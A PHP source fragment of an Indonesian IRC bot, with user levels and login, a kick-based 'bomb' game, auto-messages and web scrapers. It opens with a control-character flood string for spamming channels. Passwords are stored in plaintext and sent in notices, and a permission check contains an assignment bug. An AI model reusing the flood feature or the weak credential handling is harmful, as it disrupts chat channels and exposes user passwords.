                       "12,8M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?M�?�?�?H12M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?12M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?12M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?12M�?�?�?H�?M�?�?�?H�?M�?�?�?H�?"
                       );
        return $strflod[rand(0,count($strflod) - 1)];
    }
    function rnd_slapampun(){
        $sampunbot=array("bos kojom yuk!","aku neng kene bos!! ojo atek dislaps!!","sini� pv aq bos","kenapa bos?!!","wedew","muach..muach...","ciatsssss... hehehe..","slap� pingin di tium ta?","ampun bosss, aku ndak nakal lagi","siaaaappp bos, ada yang bisa saya buantingin? piring, gelas gtu..",
                         "hiks..nasib�","jadi tukang slap ya, bos?","edan!!!","mama... tolong....","papa... tolong...","ada apa bos!!!, slap� ra ngerti sik kojom apa?","watauuu tega banget kau boss!!!","Siap!!!","aku di sini sayang","lagi enak� kojom dislap ikz.",
                         "Ready!!","aduh...jangan di slap dong.. pv aja","iya sayang...","Boss JELEK!!!","Ready to command!","scream!!!!","mama... bos Q jahat!","jahat banget sihh..","What Mission?");
        return $sampunbot[rand(0,count($sampunbot) - 1)];
    }
    function rnd_slapme(){
        $slapme=array("egk boleh slap ya say...","tak ada ampun buat loh!","nangisooo ae... 4Dont Slap Me!!","heheheh ciatsssssssssss. tendangan jet lee","Rasakan ini...","Dudutz","yeee...pv aja, gk usah pake slap..");
        return $slapme[rand(0,count($slapme) - 1)];
    }
    function rnd_slapbos(){
        $slapbos=array("huneQ jangan dislap!!","Fuk...","Dont slap my bos!!","bosQ masih sibuk","bosQ lagi tidur, mohon jangan di ganggu, yeeeeaaaaaahhhhhh","jangan ganggu boskuuuuuu","ra ngerti bos lagi sibuk apa... ciattttttttttt jwedak");
        return $slapbos[rand(0,count($slapbos) - 1)];
    }
    #### MODULE IRC #######
    
    function send($sock,$msg){fputs($sock,"$msg".CRLF); }
    function quit($sock,$msg){if($msg){$this->send($sock,"QUIT :$msg");}  else {$this->send($sock,"QUIT");}sleep(2);   }
    function msg($sock,$to,$msg){$this->send($sock,"PRIVMSG $to :$msg");}
    function act($sock,$to,$msg){$this->send($sock,'PRIVMSG '.$to.' :'.'ACTION '.$msg.'');}
    function invite($sock,$to,$chan){$this->send($sock,"INVITE $to $chan");}
    function notice($sock,$to,$msg){$this->send($sock,"NOTICE $to :$msg");}
    function join($sock,$chan,$kunci=Null){$this->send($sock,"JOIN $chan $kunci"); }
    function part($sock,$chan,$msg){if($msg){$this->send($sock,"PART $chan :$msg");}  else {$this->send($sock,"PART $chan");}   }
    function Cycle($sock,$chan,$msg){ if ($msg){$this->part($sock,$chan,$msg);}else{$this->part($sock,$chan,$msg);}        sleep(2);        $this->join($sock,$chan);    }
    function nick($sock,$newnick){$this->send($sock,"NICK $newnick");    }
    function mode($sock,$mod,$chan,$who){$this->send($sock,"MODE $chan $mod $who");    }
    function kick($sock,$chan,$who,$msg){if($msg){$this->send($sock,"KICK $chan $who :$msg");}else{$this->send($sock,"KICK $chan $who");}    }
    function kickserv($sock,$chan,$who,$msg){$this->msg($sock,"CHANSERV","KICK $chan $who $msg"."");    }
    function ban($sock,$chan,$who){$this->mode($sock,"+bbb ",$chan,$who);    }
    function unban($sock,$chan,$who){$this->mode($sock,"-bbb ",$chan,$who);    }
    function away($sock,$msg){$this->send($sock,"AWAY :$msg");    }
    function noaway($sock){$this->send($sock,"AWAY");    }
    function topic($sock,$chan,$msg){$this->send($sock,"TOPIC $chan $msg");    }
    ####################
    
    
    ##########################
    function add_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"] = $user_chan_arr[strtolower($chan)]["nick"].' '.$nick. ' ';
        $user_chan_arr[strtolower($chan)]["chan"]=strtolower($chan);
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function change_nickchan($nick,$newnick){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
            $x_chan=$cur_xchan["chan"];
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace(' '.$nick.' ',' '.$newnick.' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
	    $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ',' ',$user_chan_arr[strtolower($x_chan)]["nick"]);
            $user_chan_arr[strtolower($x_chan)]["nick"]=str_replace('  ','',$user_chan_arr[strtolower($x_chan)]["nick"]);
	}
        return "ok";
    }
    function del_nickchan($chan,$nick){
        global $user_chan_arr;
        $user_chan_arr[strtolower($chan)]["nick"]=str_replace(' '.$nick.' ',' ',$user_chan_arr[strtolower($chan)]["nick"]);
	$user_chan_arr[strtolower($chan)]["nick"]=str_replace("  "," ",$user_chan_arr[strtolower($chan)]["nick"]);
        return "ok";
    }
    function show_nickchan($chan){
        global $user_chan_arr;
        $res_nick=$user_chan_arr[strtolower($chan)]["nick"];
        $res_nick=ltrim($res_nick);
        return $res_nick;
    }
    function show_chan(){
        global $user_chan_arr,$bot;
        foreach ($user_chan_arr as $cur_xchan) {
            $showchn=$cur_xchan["chan"];
            if($bot['roomnet']==$cur_xchan["chan"]){$showchn="";};
            if($bot['basechan']==$cur_xchan["chan"]){$showchn="";};
            if($showchn!=""){$res_chan=$res_chan.';'.$cur_xchan["chan"];}
	}
        return $res_chan;
    }
    function destroy_chan($chan){
        global $user_chan_arr;
        unset ($user_chan_arr[$chan]);
        return "ok";
    }
    function destroy_allchan(){
        global $user_chan_arr;
        foreach ($user_chan_arr as $cur_xchan) {
		unset ($user_chan_arr[$cur_xchan["chan"]]);
	}
        unset ($user_chan_arr);
        return "ok";
    }
    #####################
    
    function user_list($nick){
        global $auth;
        $userlist="";
	foreach ($auth as $ulist) {if($ulist["name"]){$userlist .= $ulist["name"].'('.$ulist["status"].')';}}
        return $userlist;
    }
    function add_user($sock,$nick,$user,$pass,$level){
        global $auth,$bot;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        $level = strtolower($level);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
                if ($level=="master" || $level=="user" || $level="admin") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                    $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> <admin|master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($level=="master" || $level=="user") {
                    if(!$auth["$user"]["name"]){
                    $auth["$user"]["name"] = $user;
                    $auth["$user"]["pass"] = $pass;
                    $auth["$user"]["status"] = $level;
                    $auth["$user"]["auth"] = 1;
                    $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                    $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                    $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    }else{
                        $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.');
                    }
		} else {$this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> <master|user>');}
            }
            elseif ($auth["$nick"]["status"]=="master") {
		if (!$auth["$nick"]["name"]) {
                    if ($level=="user") {
			$auth["$user"]["name"] = $user;
			$auth["$user"]["pass"] = $pass;
			$auth["$user"]["status"] = $level;
			$auth["$user"]["auth"] = 1;
                        $this->notice($sock,$nick,'ADD ['.$user.'] '.$level.' LIsT');
                        $this->notice($sock,$user,''.$anick.' ADD YoU To '.$level.' LIsT wiTh PaSSWoRd: '.$pass);
                        $this->notice($sock,$user,'/msg '.$bot['nick'].' ^login <password>');
                    } else { $this->notice($sock,$nick,'Wrong Command! Type:.Adduser <nick> <pass> user'); }
		} else { $this->notice($sock,$nick,$user .' is already exist on '.$auth["$user"]["status"].' list.'); }
            } else {$this->notice($sock,$nick,'Unknown Status! Your Status is '.$auth["$nick"]["status"]);}
        }
    }
    function del_user($sock,$nick,$user){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
	$user = strtolower($user);
        if ($auth["$nick"]["auth"]==2) {
            if ($auth["$nick"]["status"]=="Owner") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user" || $auth["$user"]["status"]=="admin") {
                    $this->notice($sock,$nick,'DEL ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="admin") {
		if ($auth["$user"]["status"]=="master" || $auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'DEL ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else {$this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
            elseif ($auth["$nick"]["status"]=="master") {
                if ($auth["$user"]["status"]=="user") {
                    $this->notice($sock,$nick,'DEL ['.$user.'] '.$auth["$user"]["status"].' LIsT');
                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else { $this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
	}
    }
    function chgpass_user($sock,$nick,$oldpass,$newpass){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
        if ($auth["$nick"]["auth"]==2) {
	    if ($oldpass===$auth["$nick"]["pass"]) {
		$auth["$nick"]["pass"] = $newpass;
                $this->notice($sock,$nick,'Password Change to: 4'.$auth["$nick"]["pass"].'4');
            } else {$this->msg($sock,$nick,'PASSWORD 4!FaILED!');}
	}
    }
    function level_user($nick){
        global $auth;
        $nick=strtolower($nick);
        if ($auth["$nick"]["status"]=="user"){$stauth=1;}
	elseif ($auth["$nick"]["status"]=="master"){$stauth=2;}
	elseif (strtolower($auth["$nick"]["status"])=="admin"){$stauth=3;}
        elseif (strtolower($auth["$nick"]["status"])=="owner"){$stauth=4;}
        else{$stauth=0;};
        return $stauth;
    }
    function is_userbot($nick){
        global $auth;
        $isuser=0;$nick=strtolower($nick);
        if ($auth["$nick"]) {if ($auth["$nick"]["pass"]) {$isuser=1;}}
        return $isuser;
    }
    function is_loginbot($nick,$ident,$host){
        global $auth;
        $islogin=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($auth["$nick"]["auth"]==2){
                if($auth["$nick"]["ident"]==$ident){
                    if($auth["$nick"]["host"]==$host){
                        $timelog=time()- $auth["$nick"]["time"];
                        if($timelog<=3600){ $auth["$nick"]["time"]=time();$islogin=1;}else{$auth["$nick"]["auth"]=1;}
                    }else{$auth["$nick"]["auth"]=1;}
                }else{$auth["$nick"]["auth"]=1;}
            }else{$auth["$nick"]["auth"]=1;}
        }
        return $islogin;
    }
    function loginbot($nick,$ident,$host,$pass){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($pass===$auth["$nick"]["pass"]){
                $auth["$nick"]["auth"]=2;$auth["$nick"]["time"]=time();$sukseslog=1;
            }
        }
        return $sukseslog;
    }
    function logoutbot($nick){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
                $auth["$nick"]["auth"]=1;$auth["$nick"]["time"]=time();$sukseslog=1;
        }
        return $sukseslog;
    }
    ###############################
    
    function stuf_ping($sock,$chan,$nick){
        global $ping;
        $sendping=time();$ping["$sendping"]["ping"] = time();
	$ping["$sendping"]["chan"] = $chan;$ping["$sendping"]["nick"] = strtolower($nick);
	$this->msg($sock,$nick,'PING '.$ping["$sendping"]["ping"].'');
    }
    function stuf_lag($sock,$nick,$dataping){
        global $ping;
        $dataping=str_replace(chr(1),"",$dataping);$dataping=str_replace("\r","",$dataping);
        $dataping=str_replace("\n","",$dataping);$dataping=str_replace("","",$dataping);
        if ($ping["$dataping"]["ping"]==$dataping && $ping["$dataping"]["nick"]==strtolower($nick)){
            $pong = time();$pptime = $pong - $dataping;$meni = "";
            if ($pptime>=60) {
                $bag = $pptime / 60;$meni = floor($bag)."mins ";$sis = $pptime - ($meni*60);$pptime = $sis;
            }
            $deti = $pptime."secs";$pptime = "$meni$deti";
            $this->msg($sock,$ping["$dataping"]["chan"],'15(pong04!15) Lag RepLy Bwt '.$nick.' : '.$pptime);
            unset($ping["$dataping"]["nick"]);unset($ping["$dataping"]["ping"]);unset($ping["$dataping"]["chan"]);
        }
    }
    #############################
    function stuf_potong($sock,$nickna,$chan,$pilwar){
        global $warnabenar,$bw,$targetboom,$goboom,$onboom,$chanboom;
        $pilihanwar=strtolower($pilwar);$warnabenar=strtolower($warnabenar);
        if(strtolower($nickna)==strtolower($targetboom) && strtolower($chanboom)==strtolower($chan)){
            if($pilihanwar==strtolower($bw[0]) || $pilihanwar==strtolower($bw[1]) || $pilihanwar=="biru" ){
                if($warnabenar==$pilihanwar){
                    $this->msg($sock,$chan,'Selamat '.$nickna.', dancok we pinter menjinakan Bom, Mantaaaap!!');
                    $this->mode($sock,'+vvv',$chan,$nickna);
		}
		else{
                  //  $this->kickserv($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Dadi uwong seng pinter nebak,ben gak kenek booom.');
                    $this->kick($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Dadi uwong seng pinter nebak,ben gak kenek booom.');
		}
                $goboom=0;$onboom="off";$targetboom="";$chanboom="";
           }
        }
    }
    function stuf_bom($sock,$chan,$targetbm){
        global $chanboom,$bot,$onboom,$warnaboom,$targetboom,$bw,$goboom,$tmpwbom,$tmboom,$warnabenar,$timeboom;
        if(strpos(strtolower($this->show_nickchan($chan)),' '.strtolower($targetbm).' ') && $onboom=="off" && $targetbm!=strtolower($bot['nick'])){
            $onboom="on";$goboom=0;$targetboom=$targetbm;$chanboom=$chan;
            $tmpwbom=$warnaboom;$wrnb=explode(";",$tmpwbom);
            $bw[0]=$wrnb[rand(0,count($wrnb) - 1)];unset($wrnb);
            $tmpwbom=str_replace($bw[0],"",$tmpwbom);$tmpwbom=str_replace(";;",";",$tmpwbom);
            $wrnb=explode(";",$tmpwbom);
            $bw[1]=$wrnb[rand(0,count($wrnb) - 1)];
            unset($wrnb);
            $tmboom=time();$warnabenar=$bw[rand(0,count($bw) - 1)];
            $this->act($sock,$chan,'memasukan BOM ke dalam baju '.$targetbm);
            $this->msg($sock,$chan,$targetbm.'!! km punya waktu ['.$timeboom.'] detik. Jinakkan Bom dengan memotong kabel yg benar. Dan hanya ada tiga kabel. '.$bw[0] .', '.$bw[1].' dan Biru');
       }
    }
    #############################
    function stuf_ison($sock,$msg){
        global $listison,$chanson,$ada2,$ada1;
        $listson=strtolower($msg);$xpgetison=explode(" ",$listson);
	$i=0;$jmlolol=0;
	foreach ($xpgetison as $pgetlist){if($pgetlist){$i++;$sonson[$i]=$pgetlist;$jmlolol=$i;}}
	$i=0;
	foreach ($listison as $pgetlist){if ($pgetlist){$i++;$lsonson[$i]=$pgetlist;$jmlson=$i;}}
	$dafonline="";$dafoffline="";
	for ($i = 1; $i <= $jmlson; $i++) {
            $satup=$lsonson[$i];$ds=0;
            for ($p = 1; $p <= $jmlolol; $p++) {if ($satup==$sonson[$p]){$ds=1;}}
            if ($ds==1){if(!$ada1["$satup"]){$dafonline .=$satup.' ';$ada1["$satup"]=true;$ada2["$satup"]=false;}}
            else{if(!$ada2["$satup"]){$dafoffline .=$satup.' ';$ada2["$satup"]=true;$ada1["$satup"]=false;}}
	}
	$dafonline=ltrim($dafonline);$dafonline=rtrim($dafonline);$dafoffline=ltrim($dafoffline);$dafoffline=rtrim($dafoffline);
	if ($dafonline){fputs($sock, 'PRIVMSG '. $chanson .' :15(04Ison15) On IRC : '.$dafonline . CRLF);}
	if ($dafoffline){fputs($sock, 'PRIVMSG '. $chanson .' :15(04Ison15) Left IRC : '.$dafoffline . CRLF);}
	unset($lsonson);unset($sonson);
    }
    function add_ison($str){
        global $listison;
        $str=strtolower($str);
        if(in_array($str,$listison)){return 0;}
        else{array_push($listison,$str);return 1;}
        
    }
    function show_ison(){
        global $listison;
        $str_ison="";
        foreach ($listison as $lstr){$str_ison.=$lstr . ' ';}
        $str_ison=str_replace("  "," ",$str_ison);$str_ison=ltrim($str_ison);$str_ison=rtrim($str_ison);
        return $str_ison;
    }
    function del_ison($str){
        global $listison;
        $str_ison="";$str=strtolower($str);
        if(in_array($str,$listison)){
            foreach ($listison as $lstr){
                if(strtolower($str)!=strtolower($lstr)){
                    $str_ison.=$lstr . ';';
                }
            }
            $str_ison=str_replace(";;",";",$str_ison);$str_ison=ltrim($str_ison,";");$str_ison=rtrim($str_ison,";");
            $listison=explode(";",strtolower($str_ison));
            return 1;
        }
        else{return 0;}
    }
    ###############################
    function auto_cy($sock){
        global $systembot,$user_chan_arr;
        $this->send($sock,"PING :88888654476");
        foreach ($user_chan_arr as $cur_xchan) {
            if($systembot['AUTOCYCLE'][strtoupper($cur_xchan["chan"])]=="3ON"){
                $this->part($sock,$cur_xchan["chan"],$this->rnd_cycle());sleep (2);$this->join($sock,$cur_xchan["chan"]);sleep(3);
            }
	}
        return "";
    }
    
    ##############################
    function mod_updatemsg($urlmsg){
        global $listamsg;
        if($urlmsg){
            $famsg = fopen ($urlmsg, "rb");$camsg = "";
            do {
		$barismsg = fread($famsg, 3072);
		if (strlen($barismsg) == 0) { break; }
                    $camsg .= $barismsg;
            } while(true);
            fclose ($famsg);
            $camsg = str_replace("\n","[*Y*]",$camsg);$camsg = str_replace("\r","[*Y*]",$camsg);
            $camsg = str_replace("[*Y*][*Y*]","[*Y*]",$camsg); $camsg = str_replace("[*Y*][*Y*]","[*Y*]",$camsg);$camsg=ltrim($camsg,"[*Y*]");$camsg=rtrim($camsg,"[*Y*]");
            $listamsg=explode("[*Y*]",$camsg);
        }
        return count($listamsg);
    }
    function mod_resetmsg(){
        global $listamsg;
        foreach ($listamsg as $lstr){$i++;unset ($listamsg[$i]);}
    }
    function mod_automsg($sock){
        global $user_chan_arr,$systembot;
        $this->send($sock,"PING :88888654476");
        foreach ($user_chan_arr as $cur_xchan) {
            if($systembot['AUTOMSG'][strtoupper($cur_xchan["chan"])]=="3ON"){
                $this->msg($sock,$cur_xchan["chan"],$this->mod_playmsg());sleep(2);
            }
	}
        return "";
    }
    function mod_playmsg(){
        global $intamsg,$listamsg;
        if($intamsg < 0 ){$intamsg=0;}
        if($intamsg >= count($listamsg)){$intamsg=0;}
        $strnya=$listamsg[$intamsg];$intamsg++;
        return $strnya;
    }
    function mod_addmsg($str){
        global $listamsg;
        $adastr=0;
        foreach ($listamsg as $lstr){
            if(strtolower($str)==strtolower($lstr)){$adastr=1;}
        }
        if($adastr==0){$listamsg[count($listamsg)]=$str;}
        return $adastr;
    }
    ///////////////////////////////////
    function mod_updateact($urlact){
        global $listaact;
        if($urlact){
            $faact = fopen ($urlact, "rb");$caact = "";
            do {
		$barisact = fread($faact, 3072);
		if (strlen($barisact) == 0) { break; }
                    $caact .= $barisact;
            } while(true);
            fclose ($faact);
            $caact = str_replace("\n","[*Y*]",$caact);$caact = str_replace("\r","[*Y*]",$caact);
            $caact = str_replace("[*Y*][*Y*]","[*Y*]",$caact); $caact = str_replace("[*Y*][*Y*]","[*Y*]",$caact);$caact=ltrim($caact,"[*Y*]");$caact=rtrim($caact,"[*Y*]");
            $listaact=explode("[*Y*]",$caact);
        }
        return count($listaact);
    }
    function mod_resetact(){
        global $listaact;
        foreach ($listaact as $lstr){$i++;unset ($listaact[$i]);}
    }
    function mod_autoact($sock){
        global $user_chan_arr,$systembot;
        $this->send($sock,"PING :88888654476");
        foreach ($user_chan_arr as $cur_xchan) {
            if($systembot['AUTOACT'][strtoupper($cur_xchan["chan"])]=="3ON"){
                $this->act($sock,$cur_xchan["chan"],$this->mod_playact());sleep(2);
            }
	}
        return "";
    }
    function mod_playact(){
        global $intaact,$listaact;
        if($intaact < 0 ){$intaact=0;}
        if($intaact >= count($listaact)){$intaact=0;}
        $strnya=$listaact[$intaact];$intaact++;
        return $strnya;
    }
    function mod_addact($str){
        global $listaact;
        $adastr=0;
        foreach ($listaact as $lstr){
            if(strtolower($str)==strtolower($lstr)){$adastr=1;}
        }
        if($adastr==0){$listaact[count($listaact)]=$str;}
        return $adastr;
    }
    ##################################
    function mod_astro($astro){
        global $zodiak;
        $astro = strtolower($astro);
        $this->send($sock,"PING :1097658652");
        if (in_array($astro, $zodiak)) {
            $pages = "http://www.astaga.com/astrologi/?cat=$astro";
            $handi = fopen ($pages, "rb");
            $konten = "";
            do {
               $baris = fread($handi, 512);
               if (strlen($baris) == 0) { break; }
               $konten .= $baris;
            } while(true);
            fclose ($handi);
            $this->send($sock,"PING :1097658651");
            $zod1 = stristr($konten,'<td id=ast><p>');
            $zod2 = stristr($zod1,'</table>');
            $bintang = str_replace($zod2,"",$zod1);
            $bintang = str_replace("\n","",$bintang);
            $bintang = str_replace("<td id=ast><p>","".ucfirst(strtolower($astro))." ",$bintang);
            $bintang = str_replace("</p>"," ",$bintang);
            $bintang = str_replace("<p><b>","",$bintang);
            $bintang = str_replace("</b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
            $bintang = str_replace("<b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
            $bintang = str_replace("</tr>","",$bintang);
            $bintang = str_replace("<tr>","",$bintang);
            $zod3 = stristr($bintang,'<td colspan=2 id=ast bgcolor="#e0e0e0">');
            $bintang = str_replace($zod3,"",$bintang);
            return $bintang;
        }
        else{
            return "Maaf nama bintang yg km masukan tdk ada";
        }

    }
    function mod_uspoof($sock,$msg){
        global $isisp,$jmlspoof;
        $this->send($sock,"PING :0000927651");
        $spoof=strtolower($msg);
	$spallnet = "http://www.allnetwork.or.id/Pendaftaran/Personal_spoof/?mode=view&server=$spoof";
	///$spallnet="http://localhost/spoof1.html";
	$handisp = fopen ($spallnet, "rb");
	$kontensp = "";
        do {
		$barissp = fread($handisp, 512);
		if (strlen($barissp) == 0) { break; }
		$kontensp .= $barissp;
	} while(true);
	fclose ($handisp);
	$kontensp=strtolower($kontensp);
	$kontensp = str_replace("  "," ",$kontensp);
	$kontensp = str_replace("\n","",$kontensp);
	$kontensp = str_replace(chr(9),"",$kontensp);
	$kontensp = str_replace("\r","",$kontensp);
	$kontensp = str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$kontensp);
	for ($i = 1; $i <= 10; $i++) {$kontensp = str_replace("  "," ",$kontensp);}
	$kontensp = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$kontensp);
	$tmpjml1=stristr($kontensp,"<tr bgcolor=yellow><td colspan=10 align=right>found ");
	$tmpjml2=stristr($kontensp," data</td></tr>");
								
	$tmpjml=str_replace($tmpjml2,"",$tmpjml1);
	$tmpjml=str_replace("<tr bgcolor=yellow><td colspan=10 align=right>found ","",$tmpjml);
	$kontensp = str_replace("</td> <td>","</td><td>",$kontensp);
	$kontensp = str_replace("<tr bgcolor=white> <td align=right>","<tr bgcolor=white><td align=right>",$kontensp);
	$kontensp = str_replace("</tr> <tr","</tr><tr",$kontensp);
	$kontensp =  str_replace(" </td>","</td>",$kontensp);
	$kontensp =str_replace("> <td","><td",$kontensp);
        
        for ($i = 1; $i <= $tmpjml; $i++) {
		if ($i==$tmpjml){
                        $identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=#1b6cf7>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
		else{
			$identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=white>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
								
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
                
	}
        $jmlspoof["$spoof"]=$tmpjml;
        return $jmlspoof["$spoof"];
    }
    function mod_uslang($sock,$msg){
        global $kmusedan,$kmjml;
        //$urledan="http://localhost/aa.html";
        $urledan="http://www.malesbanget.com/kamus/definisi.php?kata=".$msg;
        $btsstr='<td class='.chr(34).'BOX'.chr(34).'><span class='.chr(34).'KAMUS'.chr(34).'><span class='.chr(34).'kecil'.chr(34).'>';
        $btsstrtab1='<table width='.chr(34).'100%'.chr(34).' border='.chr(34).'0'.chr(34).' cellpadding='.chr(34).'0'.chr(34).' cellspacing='.chr(34).'0'.chr(34).'>';
        $btsstrtab2='</table>';
        $strsplit='<h2 align='.chr(34).'left'.chr(34).'>';
        $kedan = fopen ($urledan, "rb");
        $cotedan = "";
        do {
                $bcotedan = fread($kedan, 1024);
                if (strlen($bcotedan) == 0) { break; }
                $cotedan .= $bcotedan;
        } while(true);
        fclose ($kedan);
        if(strpos($cotedan,$btsstr)){
            $cotedan=substr($cotedan,strpos($cotedan,$btsstr) + strlen($btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,$btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,'<p><span class='.chr(34).'signature'.chr(34).'>'));
            $intedan=substr_count($cotedan,"  ");
            for ($i = 1; $i <= $intedan; $i++) {$cotedan=str_replace("  "," ",$cotedan);}
            $intedan=substr_count($cotedan,$btsstrtab1);
            for ($i = 1; $i <= $intedan; $i++) {
            $tmpctedan='';
            $tmpctedan=substr($cotedan,strpos($cotedan,$btsstrtab1));
            $tmpctedan=substr($tmpctedan,0,strpos($tmpctedan,$btsstrtab2) + strlen($btsstrtab2));
            $cotedan=str_replace($tmpctedan,"",$cotedan);
            }
